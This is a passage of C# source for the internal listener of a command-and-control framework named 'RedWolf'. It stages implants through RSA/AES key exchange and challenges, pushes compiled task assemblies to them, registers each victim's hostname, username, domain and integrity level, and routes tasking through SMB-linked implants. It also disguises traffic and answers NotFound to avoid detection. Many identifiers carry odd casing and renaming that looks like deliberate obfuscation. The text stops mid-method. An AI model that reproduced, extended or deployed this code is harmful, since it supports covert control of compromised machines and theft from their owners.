using System;
using System.IO;
using System.Xml;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Reflection;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

using Microsoft.Rest;
using Microsoft.CodeAnalysis;
using Microsoft.AspNetCore.SignalR.Client;
using Newtonsoft.Json;

using RedWolf.Core;
using RedWolf.API;
using APIModels = RedWolf.API.Models;

namespace RedWolf.Models.Listeners
{
    public class InternalListener
    {
        public class NewMessageArgs : EventArgs
        {
            public string Guid { get; set; }
            public NewMessageArgs(string Guid)
            {
                this.Guid = Guid;
            }
        }

        public event EventHandler<NewMessageArgs> OnNewMessage = delegate { };

        private HubConnection _connection;
        private IRedWolfAPI _client;
        private ProfileTransformAssembly _transform;
        private readonly ModelUtilities _utilities = new ModelUtilities();

        internal enum GrawlMessageCacheStatus
        {
            Ok,
            NotFound
        }
        internal class GrawlMessageCacheInfo
        {
            public APIModels.GrawlTasking Tasking { get; set; }
            public string Message { get; set; }
            public GrawlMessageCacheStatus Status { get; set; }
        }

        internal class ProfileTransformAssembly
        {
            public int Id { get; set; }
            public byte[] ProfileTransformBytes { get; set; }
        }

        private readonly object _hashCodesLock = new object();
        private readonly HashSet<int> CacheTaskHashCodes = new HashSet<int>();
        private ConcurrentDictionary<string, ConcurrentQueue<GrawlMessageCacheInfo>> GrawlMessageCache { get; set; } = new ConcurrentDictionary<string, ConcurrentQueue<GrawlMessageCacheInfo>>();

        public InternalListener()
        {

        }

        public InternalListener(APIModels.Profile profile, string ListenerGuid, string RedWolfUrl, string RedWolfToken)
        {
            _ = Configure(profile, ListenerGuid, RedWolfUrl, RedWolfToken);
        }

        public class AlwaysRetryPolicy : IRetryPolicy
        {
            public TimeSpan? NextRetryDelay(RetryContext context)
            {
                if (context.PreviousRetryCount == 0)
                {
                    return TimeSpan.Zero;
                }
                if (context.PreviousRetryCount < 5)
                {
                    return TimeSpan.FromSeconds(5);
                }
                return TimeSpan.FromSeconds(10);
            }
        }

        public async Task Configure(APIModels.Profile profile, string ListenerGuid, string RedWolfUrl, string RedWolfToken)
        {
            _transform = new ProfileTransformAssembly
            {
                ProfileTransformBytes = Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
                {
                    Language = Grawls.ImplantLanguage.CSharp,
                    Source = profile.MessageTransform,
                    TargetDotNetVersion = Common.DotNetVersion.NetCore31,
                    References = Common.DefaultReferencesNetCore,
                    UseSubprocess = false
                })
            };

            X509Certificate2 redwolfCert = new X509Certificate2(Common.RedWolfPublicCertFile);
            HttpClientHandler clientHandler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) =>
                {
                    return cert.GetCertHashString() == redwolfCert.GetCertHashString();
                }
            };
            _client = new RedWolfAPI(
                new Uri(RedWolfUrl),
                new TokenCredentials(RedWolfToken),
                clientHandler
            );

            _connection = new HubConnectionBuilder()
                .WithUrl(RedWolfUrl + "/grawlHub", options =>
                {
                    options.AccessTokenProvider = () => { return Task.FromResult(RedWolfToken); };
                    options.HttpMessageHandlerFactory = inner =>
                    {
                        var HttpClientHandler = (HttpClientHandler)inner;
                        HttpClientHandler.ServerCertificateCustomValidationCallback = clientHandler.ServerCertificateCustomValidationCallback;
                        return HttpClientHandler;
                    };
                })
                .WithAutomaticReconnect(new AlwaysRetryPolicy())
                .Build();
            _connection.HandshakeTimeout = TimeSpan.FromSeconds(20);
            try
            {
                await Task.Delay(5000);
                await _connection.StartAsync();
                await _connection.InvokeAsync("JoinGroup", ListenerGuid);
                _connection.On<string>("NotifyListener", (anotherid) =>
                {
                    InternalRead(anotherid).Wait();
                });
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("InternalListener SignalRConnection Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        public static APIModels.Profile ToProfile(Profile profile)
        {
            return new APIModels.Profile
            {
                Id = profile.Id,
                Name = profile.Name,
                Type = (APIModels.ProfileType)Enum.Parse(typeof(APIModels.ProfileType), profile.Type.ToString(), true),
                Description = profile.Description,
                MessageTransform = profile.MessageTransform
            };
        }

        private ModelUtilities.GrawlEncMsg CreateMessageForGrawl(APIModels.Grawl grawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlTaskingMessage taskingMessage)
        {
            return this.CreateMessageForGrawl(grawl, targetGrawl, Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
        }

        private ModelUtilities.GrawlEncMsg CreateMessageForGrawl(APIModels.Grawl grawl, APIModels.Grawl targetGrawl, byte[] message)
        {
            List<string> path = _client.GetPathToChildGrawl(grawl.Id ?? default, targetGrawl.Id ?? default).ToList();
            path.Reverse();
            ModelUtilities.GrawlEncMsg finalMessage = null;
            ModelUtilities.GrawlEncMsgType messageType = ModelUtilities.GrawlEncMsgType.Tasking;
            foreach (string anotherid in path)
            {
                APIModels.Grawl thisGrawl = _client.GetGrawlByANOTHERID(anotherid);
                finalMessage = ModelUtilities.GrawlEncMsg.Create(
                    thisGrawl,
                    message,
                    messageType
                );
                message = Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
                messageType = ModelUtilities.GrawlEncMsgType.Routing;
            }
            return finalMessage;
        }

        private byte[] GetCompressedILAssembly35(string taskname)
        {
            return File.ReadAllBytes(Common.RedWolfTaskCSharpCompiledNet35Directory + taskname + ".compiled");
        }

        private byte[] GetCompressedILAssembly40(string taskname)
        {
            return File.ReadAllBytes(Common.RedWolfTaskCSharpCompiledNet40Directory + taskname + ".compiled");
        }

        private byte[] GetCompressedILAssembly30(string taskname)
        {
            return File.ReadAllBytes(Common.RedWolfTaskCSharpCompiledNetCoreApp30Directory + taskname + ".compiled");
        }

        private ModelUtilities.GrawlTaskingMessage GetGrawlTaskingMessage(APIModels.GrawlTasking tasking, APIModels.DotNetVersion version)
        {
            string Message = "";
            if (tasking.Type == APIModels.GrawlTaskingType.Assembly)
            {
                if (version == APIModels.DotNetVersion.Net35)
                {
                    Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.GrawlTask.Name));
                    if (tasking.Parameters.Any())
                    {
                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.RedWolfEncoding.GetBytes(P))));
                    }
                }
                else if (version == APIModels.DotNetVersion.Net40)
                {
                    Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.GrawlTask.Name));
                    if (tasking.Parameters.Any())
                    {
                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.RedWolfEncoding.GetBytes(P))));
                    }
                }
                else if (version == APIModels.DotNetVersion.NetCore31)
                {
                    Message = Convert.ToBase64String(this.GetCompressedILAssembly30(tasking.GrawlTask.Name));
                    if (tasking.Parameters.Any())
                    {
                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.RedWolfEncoding.GetBytes(P))));
                    }
                }
            }
            else
            {
                Message = string.Join(",", tasking.Parameters);
            }
            return new ModelUtilities.GrawlTaskingMessage
            {
                Type = tasking.Type,
                Name = tasking.Name,
                Message = Message,
                Token = tasking.GrawlTask == null ? false : tasking.GrawlTask.TokenTask
            };
        }

        private int GetTaskingHashCode(APIModels.GrawlTasking tasking)
        {
            if (tasking != null)
            {
                int code = tasking.Id ?? default;
                code ^= tasking.GrawlId;
                code ^= tasking.GrawlTaskId;
                code ^= tasking.GrawlCommandId ?? default;
                foreach (char c in tasking.Name) { code ^= c; }
                return code;
            }
            return Guid.NewGuid().GetHashCode();
        }

        private int GetCacheEntryHashCode(GrawlMessageCacheInfo cacheEntry)
        {
            return GetTaskingHashCode(cacheEntry.Tasking);
        }

        private void PushCache(string anotherid, GrawlMessageCacheInfo cacheEntry)
        {
            if (this.GrawlMessageCache.TryGetValue(anotherid, out ConcurrentQueue<GrawlMessageCacheInfo> cacheQueue))
            {
                lock (_hashCodesLock)
                {
                    if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                    {
                        cacheQueue.Enqueue(cacheEntry);
                        this.OnNewMessage(this, new NewMessageArgs(anotherid));
                    }
                }
            }
            else
            {
                cacheQueue = new ConcurrentQueue<GrawlMessageCacheInfo>();
                lock (_hashCodesLock)
                {
                    if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                    {
                        cacheQueue.Enqueue(cacheEntry);
                    }
                }
                this.GrawlMessageCache[anotherid] = cacheQueue;
                this.OnNewMessage(this, new NewMessageArgs(anotherid));
            }
        }

        private async Task<APIModels.Grawl> GetGrawlForGuid(string anotherid)
        {
            try
            {
                if (!string.IsNullOrEmpty(anotherid))
                {
                    return await _client.GetGrawlByANOTHERIDAsync(anotherid);
                }
            }
            catch (Exception) { }
            return null;
        }

        private async Task<APIModels.Grawl> CheckInGrawl(APIModels.Grawl grawl)
        {
            if (grawl == null)
            {
                return null;
            }
            grawl.LastCheckIn = DateTime.UtcNow;
            return await _client.EditGrawlAsync(grawl);
        }

        private async Task<APIModels.GrawlTasking> MarkTasked(APIModels.GrawlTasking tasking)
        {
            if (tasking == null)
            {
                return null;
            }
            tasking.Status = APIModels.GrawlTaskingStatus.Tasked;
            tasking.TaskingTime = DateTime.UtcNow;
            return await _client.EditGrawlTaskingAsync(tasking);
        }

        public async Task<string> Read(string anotherid)
        {
            if (string.IsNullOrEmpty(anotherid))
            {
                return "";
            }
            await CheckInGrawl(await GetGrawlForGuid(anotherid));
            if (this.GrawlMessageCache.TryGetValue(anotherid, out ConcurrentQueue<GrawlMessageCacheInfo> cache))
            {
                if (cache.TryDequeue(out GrawlMessageCacheInfo cacheEntry))
                {
                    switch (cacheEntry.Status)
                    {
                        case GrawlMessageCacheStatus.NotFound:
                            await this.MarkTasked(cacheEntry.Tasking);
                            throw new ControllerNotFoundException(cacheEntry.Message);
                        case GrawlMessageCacheStatus.Ok:
                            await this.MarkTasked(cacheEntry.Tasking);
                            return cacheEntry.Message;
                    }
                }
                return "";
            }
            await InternalRead(anotherid);
            return "";
        }

        private async Task InternalRead(string anotherid)
        {
            try
            {
                APIModels.Grawl temp = await GetGrawlForGuid(anotherid);
                APIModels.Grawl grawl = await CheckInGrawl(temp);
                if (grawl == null)
                {
                    // Invalid ANOTHERID. May not be legitimate Grawl request, respond Ok
                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = "" });
                }
                else
                {
                    IList<APIModels.GrawlTasking> grawlTaskings = await _client.GetSearchUninitializedGrawlTaskingsAsync(grawl.Id ?? default);
                    if (grawlTaskings == null || grawlTaskings.Count == 0)
                    {
                        // No GrawlTasking assigned. Respond with empty template
                        this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = "" });
                    }
                    else
                    {
                        foreach (APIModels.GrawlTasking tasking in grawlTaskings)
                        {
                            APIModels.GrawlTasking grawlTasking = tasking;
                            if (grawlTasking.Type == APIModels.GrawlTaskingType.Assembly && grawlTasking.GrawlTask == null)
                            {
                                // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
                                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = grawlTasking });
                            }
                            else
                            {
                                grawlTasking.Grawl = grawlTasking.GrawlId == grawl.Id ? grawl : await _client.GetGrawlAsync(grawlTasking.GrawlId);
                                ModelUtilities.GrawlEncMsg message = null;
                                try
                                {
                                    message = this.CreateMessageForGrawl(grawl, grawlTasking.Grawl, this.GetGrawlTaskingMessage(grawlTasking, grawlTasking.Grawl.DotNetVersion));
                                    // Transform response
                                    string transformed = this._utilities.ProfileTransform(_transform, Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject(message)));
                                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = grawlTasking });
                                }
                                catch (HttpOperationException)
                                {
                                    grawlTasking.Status = APIModels.GrawlTaskingStatus.Aborted;
                                    await _client.EditGrawlTaskingAsync(grawlTasking);
                                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "" });
            }
        }

        public async Task<string> Write(string anotherid, string data)
        {
            try
            {
                ModelUtilities.GrawlEncMsg message = null;
                try
                {
                    string inverted = Common.RedWolfEncoding.GetString(this._utilities.ProfileInvert(_transform, data));
                    message = JsonConvert.DeserializeObject<ModelUtilities.GrawlEncMsg>(inverted);
                }
                catch (Exception)
                {
                    // Request not formatted correctly. May not be legitimate Grawl request, respond NotFound
                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                    return anotherid;
                }
                APIModels.Grawl egressGrawl;
                try
                {
                    egressGrawl = anotherid == null ? null : await _client.GetGrawlByANOTHERIDAsync(anotherid);
                }
                catch (HttpOperationException)
                {
                    egressGrawl = null;
                }
                APIModels.Grawl targetGrawl = null;
                try
                {
                    targetGrawl = await _client.GetGrawlByANOTHERIDAsync(message.ANOTHERID);
                }
                catch (HttpOperationException)
                {
                    targetGrawl = null;
                    // Stage0 Guid is OriginalServerGuid + Guid
                    if (message.ANOTHERID.Length == 20)
                    {
                        string originalServerGuid = message.ANOTHERID.Substring(0, 10);
                        anotherid = message.ANOTHERID.Substring(10, 10);
                        targetGrawl = await _client.GetGrawlByOriginalServerANOTHERIDAsync(originalServerGuid);
                        if (targetGrawl != null)
                        {
                            var it = await _client.GetImplantTemplateAsync(targetGrawl.ImplantTemplateId);
                            if (egressGrawl == null && it.CommType == APIModels.CommunicationType.SMB)
                            {
                                // Get connecting Grawl as egress
                                List<APIModels.GrawlTasking> taskings = (await _client.GetAllGrawlTaskingsAsync()).ToList();
                                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ anotherid of some sort?
                                APIModels.GrawlTasking connectTasking = taskings
                                    .Where(GT => GT.Type == APIModels.GrawlTaskingType.Connect &&
                                            (GT.Status == APIModels.GrawlTaskingStatus.Progressed || GT.Status == APIModels.GrawlTaskingStatus.Tasked))
                                    .Reverse()
                                    .FirstOrDefault();
                                if (connectTasking == null)
                                {
                                    egressGrawl = null;
                                }
                                else
                                {
                                    APIModels.Grawl taskedGrawl = await _client.GetGrawlAsync(connectTasking.GrawlId);
                                    egressGrawl ??= await _client.GetOutboundGrawlAsync(taskedGrawl.Id ?? default);
                                }
                            }
                        }
                        await this.PostStage0(egressGrawl, targetGrawl, message, message.ANOTHERID.Substring(10), anotherid);
                        return anotherid;
                    }
                    else
                    {
                        this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                        return anotherid;
                    }
                }

                switch (targetGrawl.Status)
                {
                    case APIModels.GrawlStatus.Uninitialized:
                        await this.PostStage0(egressGrawl, targetGrawl, message, anotherid, anotherid);
                        return anotherid;
                    case APIModels.GrawlStatus.Stage0:
                        await this.PostStage1(egressGrawl, targetGrawl, message, anotherid);
                        return anotherid;
                    case APIModels.GrawlStatus.Stage1:
                        await this.PostStage2(egressGrawl, targetGrawl, message, anotherid);
                        return anotherid;
                    case APIModels.GrawlStatus.Stage2:
                        await this.RegisterGrawl(egressGrawl, targetGrawl, message, anotherid);
                        return anotherid;
                    case APIModels.GrawlStatus.Active:
                        await this.PostTask(egressGrawl, targetGrawl, message, egressGrawl.Guid);
                        return anotherid;
                    case APIModels.GrawlStatus.Lost:
                        await this.PostTask(egressGrawl, targetGrawl, message, egressGrawl.Guid);
                        return anotherid;
                    default:
                        this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                        return anotherid;
                }
            }
            catch
            {
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return anotherid;
            }
        }

        private async Task PostTask(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg outputMessage, string anotherid)
        {
            if (targetGrawl == null || egressGrawl == null || egressGrawl.Guid != anotherid)
            {
                // Invalid ANOTHERID. May not be legitimate Grawl request, respond NotFound
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            string TaskName = outputMessage.Meta;
            if (string.IsNullOrWhiteSpace(TaskName))
            {
                // Invalid task response. This happens on post-register write
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            APIModels.GrawlTasking grawlTasking;
            try
            {
                grawlTasking = await _client.GetGrawlTaskingByNameAsync(TaskName);
            }
            catch (HttpOperationException)
            {
                // Invalid taskname. May not be legitimate Grawl request, respond NotFound
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            if (targetGrawl == null)
            {
                // Invalid Grawl. May not be legitimate Grawl request, respond NotFound
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
            {
                // Invalid signature. Almost certainly not a legitimate Grawl request, respond NotFound
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            string taskRawResponse = Common.RedWolfEncoding.GetString(_utilities.GrawlSessionDecrypt(targetGrawl, outputMessage));
            ModelUtilities.GrawlTaskingMessageResponse taskResponse = JsonConvert.DeserializeObject<ModelUtilities.GrawlTaskingMessageResponse>(taskRawResponse);
            APIModels.GrawlCommand command = await _client.GetGrawlCommandAsync(grawlTasking.GrawlCommandId ?? default);
            await _client.AppendCommandOutputAsync(command.CommandOutputId, taskResponse.Output);

            grawlTasking.Status = taskResponse.Status;
            if (grawlTasking.Status == APIModels.GrawlTaskingStatus.Completed)
            {
                grawlTasking.CompletionTime = DateTime.UtcNow;
            }
            if (grawlTasking.Type == APIModels.GrawlTaskingType.Connect)
            {
                grawlTasking.Status = APIModels.GrawlTaskingStatus.Progressed;
            }
            await _client.EditGrawlTaskingAsync(grawlTasking);
            lock (_hashCodesLock)
            {
                this.CacheTaskHashCodes.Remove(GetTaskingHashCode(grawlTasking));
            }
            if (grawlTasking.Type == APIModels.GrawlTaskingType.SetDelay || grawlTasking.Type == APIModels.GrawlTaskingType.SetJItter ||
                grawlTasking.Type == APIModels.GrawlTaskingType.SetConneCTAttEmpts || grawlTasking.Type == APIModels.GrawlTaskingType.SetKillDate ||
                grawlTasking.Type == APIModels.GrawlTaskingType.Exit)
            {
                targetGrawl = await _client.GetGrawlAsync(targetGrawl.Id ?? default);
            }
            await CheckInGrawl(targetGrawl);
            return;
        }

        private async Task PostStage0(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlFirstResponse, string targetGuid, string anotherid)
        {
            if (targetGrawl == null || !grawlFirstResponse.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlSharedSecretPassword)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            bool egressGrawlExists = egressGrawl != null;

            if (targetGrawl.Status != APIModels.GrawlStatus.Uninitialized)
            {
                // We create a new Grawl if this one is not uninitialized
                APIModels.Grawl tempModel = new APIModels.Grawl
                {
                    Id = 0,
                    Name = Utilities.CreateShortGuid(),
                    Guid = targetGuid,
                    OriginalServerGuid = Utilities.CreateShortGuid(),
                    Status = APIModels.GrawlStatus.Stage0,
                    ListenerId = targetGrawl.ListenerId,
                    Listener = targetGrawl.Listener,
                    ImplantTemplateId = targetGrawl.ImplantTemplateId,
                    GrawlSharedSecretPassword = targetGrawl.GrawlSharedSecretPassword,
                    SmbPipeName = targetGrawl.SmbPipeName,
                    Delay = targetGrawl.Delay,
                    JItterPercent = targetGrawl.JItterPercent,
                    KillDate = targetGrawl.KillDate,
                    ConneCTAttEmpts = targetGrawl.ConneCTAttEmpts,
                    DotNetVersion = targetGrawl.DotNetVersion,
                    RuntimeIdentifier = targetGrawl.RuntimeIdentifier,
                    LastCheckIn = DateTime.UtcNow
                };
                targetGrawl = await _client.CreateGrawlAsync(tempModel);
            }
            else
            {
                targetGrawl.Status = APIModels.GrawlStatus.Stage0;
                targetGrawl.Guid = targetGuid;
                targetGrawl.LastCheckIn = DateTime.UtcNow;
                targetGrawl = await _client.EditGrawlAsync(targetGrawl);
            }
            if (!egressGrawlExists)
            {
                egressGrawl = targetGrawl;
            }

            // EncMsg is the RSA Public Key
            targetGrawl.GrawlRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
                grawlFirstResponse,
                Convert.FromBase64String(targetGrawl.GrawlSharedSecretPassword)
            ));
            // Generate negotiated session key
            using (Aes newAesKey = Aes.Create())
            {
                newAesKey.GenerateKey();
                targetGrawl.GrawlNegotiatedSessKEy = Convert.ToBase64String(newAesKey.Key);
                await _client.EditGrawlAsync(targetGrawl);
            }

            if (egressGrawlExists)
            {
                // Add this as Child grawl to Grawl that connects it
                List<APIModels.GrawlTasking> taskings = _client.GetAllGrawlTaskings().ToList();
                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ anotherid of some sort?
                APIModels.GrawlTasking connectTasking = taskings
                    .Where(GT => GT.Type == APIModels.GrawlTaskingType.Connect && (GT.Status == APIModels.GrawlTaskingStatus.Progressed || GT.Status == APIModels.GrawlTaskingStatus.Tasked))
                    .Reverse()
                    .FirstOrDefault();
                if (connectTasking == null)
                {
                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                    return;
                }
                ModelUtilities.GrawlTaskingMessage tmessage = this.GetGrawlTaskingMessage(connectTasking, targetGrawl.DotNetVersion);
                targetGrawl.Hostname = tmessage.Message.Split(",")[0];
                await _client.EditGrawlAsync(targetGrawl);
                connectTasking.Status = APIModels.GrawlTaskingStatus.Completed;
                connectTasking.Parameters.Add(targetGrawl.Guid);
                await _client.EditGrawlTaskingAsync(connectTasking);
                targetGrawl = await _client.GetGrawlAsync(targetGrawl.Id ?? default);
            }

            byte[] rsaEncryptedBytes = EncryptUtilities.GrawlRSAEncrypt(targetGrawl, Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy));
            ModelUtilities.GrawlEncMsg message = null;
            try
            {
                message = this.CreateMessageForGrawl(egressGrawl, targetGrawl, rsaEncryptedBytes);
            }
            catch (HttpOperationException)
            {
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            // Transform response
            // FirstResponse: "Id,Name,Base64(IV),Base64(AES(RSA(SessKEy))),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        private async Task PostStage1(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlSeccondResponse, string anotherid)
        {
            if (targetGrawl == null || targetGrawl.Status != APIModels.GrawlStatus.Stage0 || !grawlSeccondResponse.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (egressGrawl == null)
            {
                egressGrawl = targetGrawl;
            }
            byte[] challenge1 = _utilities.GrawlSessionDecrypt(targetGrawl, grawlSeccondResponse);
            byte[] challenge2 = new byte[4];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(challenge2);
            }
            // Save challenge to compare on response
            targetGrawl.GrawlChallenge = Convert.ToBase64String(challenge2);
            targetGrawl.Status = APIModels.GrawlStatus.Stage1;
            targetGrawl.LastCheckIn = DateTime.UtcNow;
            await _client.EditGrawlAsync(targetGrawl);

            ModelUtilities.GrawlEncMsg message;
            try
            {
                message = this.CreateMessageForGrawl(egressGrawl, targetGrawl, challenge1.Concat(challenge2).ToArray());
            }
            catch (HttpOperationException)
            {
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            // Transform response
            // SeccondResponse: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        private async Task PostStage2(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlThirdResponse, string anotherid)
        {
            if (targetGrawl == null || targetGrawl.Status != APIModels.GrawlStatus.Stage1 || !grawlThirdResponse.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (egressGrawl == null)
            {
                egressGrawl = targetGrawl;
            }
            byte[] challenge2test = _utilities.GrawlSessionDecrypt(targetGrawl, grawlThirdResponse);
            if (targetGrawl.GrawlChallenge != Convert.ToBase64String(challenge2test))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            targetGrawl.Status = APIModels.GrawlStatus.Stage2;
            targetGrawl.LastCheckIn = DateTime.UtcNow;
            await _client.EditGrawlAsync(targetGrawl);
            byte[] GrawlExecutorAssembly = await this._client.CompileGrawlExecutorAsync(targetGrawl.Id ?? default);

            ModelUtilities.GrawlEncMsg message;
            try
            {
                message = this.CreateMessageForGrawl(egressGrawl, targetGrawl, GrawlExecutorAssembly);
            }
            catch (HttpOperationException)
            {
                string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject("")));
                throw new ControllerNotFoundException(emptyTransformed);
            }

            // Transform response
            // returns: "Base64(IV),Base64(AES(GrawlExecutorAssembly)),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        private async Task RegisterGrawl(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlMessage, string anotherid)
        {
            if (targetGrawl == null || targetGrawl.Status != APIModels.GrawlStatus.Stage2 || !grawlMessage.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (egressGrawl == null)
            {
                egressGrawl = targetGrawl;
            }
            string message = Common.RedWolfEncoding.GetString(_utilities.GrawlSessionDecrypt(targetGrawl, grawlMessage));
            // todo: try/catch on deserialize?
            APIModels.Grawl grawl = JsonConvert.DeserializeObject<APIModels.Grawl>(message);
            targetGrawl.IpAddress = grawl.IpAddress;
            targetGrawl.Hostname = grawl.Hostname;
            targetGrawl.OperatingSystem = grawl.OperatingSystem;
            targetGrawl.UserDomainName = grawl.UserDomainName;
            targetGrawl.UserName = grawl.UserName;
            targetGrawl.Status = APIModels.GrawlStatus.Active;
            targetGrawl.Integrity = grawl.Integrity;
            targetGrawl.Process = grawl.Process;
            targetGrawl.LastCheckIn = DateTime.UtcNow;

            await _client.EditGrawlAsync(targetGrawl);

            ModelUtilities.GrawlTaskingMessage tasking = new ModelUtilities.GrawlTaskingMessage
            {
                Message = targetGrawl.Guid,
                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                Type = APIModels.GrawlTaskingType.Tasks,
                Token = false
            };

            ModelUtilities.GrawlEncMsg responseMessage;
            try
            {
                responseMessage = this.CreateMessageForGrawl(egressGrawl, targetGrawl, tasking);
            }
            catch (HttpOperationException)
            {
                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            // Transform response
            string transformed = this._utilities.ProfileTransform(_transform, Common.RedWolfEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        internal static class EncryptUtilities
        {
            // Returns IV (16 bytes) + EncryptedData byte array
            public static byte[] AesEncrypt(byte[] data, byte[] key)
            {
                using (Aes SessKEy = Aes.Create())
                {
                    SessKEy.Mode = Common.AesCipherMode;
                    SessKEy.Padding = Common.AesPaddingMode;
